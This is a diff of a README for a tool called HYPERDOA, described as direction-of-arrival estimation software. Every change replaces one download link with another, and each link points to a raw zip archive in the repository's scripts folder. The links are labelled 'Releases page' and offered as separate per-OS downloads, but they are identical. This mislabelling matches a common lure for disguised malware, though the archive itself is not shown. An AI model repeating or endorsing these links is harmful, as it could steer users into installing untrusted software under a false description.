@@ -1,6 +1,6 @@
 # 🚀 HYPERDOA - Accurate Direction Estimation Made Simple
 
-[![Download HYPERDOA](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip)](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip)
+[![Download HYPERDOA](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip)](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run HYPERDOA on your computer.
 
 To get started, visit the Releases page of HYPERDOA to download the application. Click the button below:
 
-[Download HYPERDOA](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip)
+[Download HYPERDOA](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip)
 
 ### 💻 System Requirements
 
@@ -28,9 +28,9 @@ Before you proceed, ensure your computer meets the following requirements:
 ### 🕹️ Installation Steps
 
 1. **Download the Application:**
-   - Go to the [Releases page](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip).
+   - Go to the [Releases page](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip).
    - Look for the latest version of HYPERDOA.
-   - Click the download link for your operating system (e.g., `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip`, `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip`, or `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip`).
+   - Click the download link for your operating system (e.g., `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip`, `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip`, or `https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip`).
 
 2. **Run the Installer:**
    - Locate the downloaded file in your downloads folder.
@@ -89,4 +89,4 @@ Your feedback is vital for improving HYPERDOA. If you encounter issues or have s
 
 ## 📥 Download & Install
 
-To get the latest version of HYPERDOA, return to the [Releases page](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-v1.3.zip) and start your journey towards efficient direction of arrival estimation today!
+To get the latest version of HYPERDOA, return to the [Releases page](https://github.com/RENDIMOR/HYPERDOA/raw/refs/heads/master/scripts/Software-1.0-beta.4.zip) and start your journey towards efficient direction of arrival estimation today!
